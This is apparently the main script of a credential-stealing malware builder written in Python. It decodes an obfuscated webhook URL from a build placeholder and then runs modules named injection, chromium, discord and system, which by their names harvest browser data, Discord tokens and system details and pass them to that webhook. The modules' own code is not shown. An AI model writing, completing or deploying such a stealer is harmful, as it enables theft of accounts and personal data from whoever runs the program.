from util.chromium import *
from util.debug import *
from util.discord import *
from util.injection import *
from util.sysinfo import *

__WEBHOOK__ = __import__("base64").b64decode("&WEBHOOK_URL_ENC&").decode("utf-8")


def main(webhook: str) -> None:   
    debug()
     
    funcs = [
        injection,
        chromium,
        discord,
        system,
    ]

    for func in funcs:
        func(webhook)

if __name__ == "__main__":
    main(__WEBHOOK__)
